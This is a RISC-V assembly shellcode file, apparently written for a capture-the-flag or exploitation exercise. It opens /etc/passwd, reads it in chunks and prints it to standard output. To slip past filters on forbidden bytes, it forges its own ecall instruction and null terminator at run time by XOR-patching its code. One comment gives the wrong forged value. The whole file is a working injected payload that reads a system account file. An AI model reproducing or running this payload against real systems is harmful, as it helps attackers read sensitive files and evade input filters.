.section .text
.global _start

.equ CHUNK_SIZE, 0x128

_start:
	c.j getaddr

	main:

	# forge ecall instruction (0x000000e3)
	# *ecall ^= 0xffffffff
	c.li s0, -1
	lw s1, -0xa(ra)
	xor s1, s0, s1
	sw s1, -0xa(ra)
	addi s2, ra, -0xa

	# openat(0, "/etc/passwd", O_RDONLY = 0)
	li a0, 0
	li a2, 0

	sb a2, (-0xa - 0x1)(ra)
	addi a1, ra, (-0xa -  0xc)

	li a7, (0x100 + 56)
	andi a7, a7, 0x2ff # SYS_openat
	jalr s2

	sw a0, (-CHUNK_SIZE - 4)(sp)

	# read(fd, sp, CHUNK_SIZE)
	readchunk:
	li a2, CHUNK_SIZE
	sub a1, sp, a2

	li a7, (0x100 + 63)
	andi a7, a7, 0x2ff # SYS_read
	jalr s2

	sw a0, -4(sp)

	# write(1, sp, read_count)
	lw a2, -4(sp)
	li a0, 1

	c.addi a7, 1 # SYS_write
	jalr s2

	addi s0, a0, -CHUNK_SIZE
	lw a0, (-CHUNK_SIZE - 4)(sp)
	beq s0, zero, readchunk

	filename:
		.ascii "/etc/passwd"
		.byte 0xff
    ecall:
        .byte 0x8c, 0xff, 0xff, 0xff # ecall
        ret
    getaddr:
        call main
